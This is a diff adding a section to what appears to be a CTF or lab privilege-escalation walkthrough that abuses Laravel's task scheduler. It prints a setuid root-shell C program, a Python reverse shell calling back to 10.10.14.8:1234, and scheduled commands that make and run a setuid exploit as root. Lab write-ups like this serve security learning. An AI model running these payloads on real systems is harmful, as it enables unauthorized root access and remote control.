@@ -84,6 +84,71 @@
  
 ![image](https://user-images.githubusercontent.com/123066149/230385136-1a3f0f26-5b4a-4cb4-ba99-e07374157c21.png)
 
+# ${{\color{green}crontab : laravel }}\ $
+
+### After several tests :
+
+![image](https://user-images.githubusercontent.com/123066149/230634694-6920625d-281e-49c5-a687-4fb1b9372c2f.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230634779-11fe97a2-10f1-42f5-be3f-c7e665cef787.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230634825-5993b949-ca7f-4348-9740-615a00dd30e4.png)
+
+``laravel create scheduling command``
+
+![image](https://user-images.githubusercontent.com/123066149/230634984-e44a88f4-e6a0-401c-a5df-4ad72dc7588f.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230635108-fa52df3f-05b4-45f4-8e63-5c10950b2ee5.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230635150-71e5ac77-1e4f-4119-884f-060caf575eb4.png)
+
+``find / -name Kernel.php 2>/dev/null``
+
+![image](https://user-images.githubusercontent.com/123066149/230635422-2611c03b-2640-45d1-a146-5c9703dd2e91.png)
+
+### I tested this setuid program but whiout success :
+
+![image](https://user-images.githubusercontent.com/123066149/230635650-2cc15c20-0baf-4f7c-b1b6-4edea017165c.png)
+
+``int main(void)
+{
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+}``
+
+
+``gcc setuid_binary.c -o setuid_exploit``
+
+![image](https://user-images.githubusercontent.com/123066149/230635987-e16b47d9-6485-464a-b0a5-d279f7da55b9.png)
+
+
+``import socket,subprocess,os``
+
+``s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)``
+
+``s.connect(("10.10.14.8",1234))``
+
+``os.dup2(s.fileno(),0)``
+
+``os.dup2(s.fileno(),1)``
+
+``os.dup2(s.fileno(),2)``
+
+``import pty``
+
+``pty.spawn("sh")``
+
+![image](https://user-images.githubusercontent.com/123066149/230636554-50985f6e-9dc2-444a-9e95-74042e4afa72.png)
+
+``$schedule->exec('ping -c 2 10.10.14.8')->everyMinute();``
+
+``$schedule->exec('chown root:root /tmp/exploit.py; chmod 4755 /tmp/exploit.py')->everyMinute();``
+
+``$schedule->exec('/usr/bin/python /tmp/exploit.py')->everyMinute();``	
+
+![image](https://user-images.githubusercontent.com/123066149/230636977-b70f2739-bb25-411d-9a3c-81b9995d2964.png)
+
 # ${{\color{green}crontab + lib os}}\ $
 
 ``ls /opt``
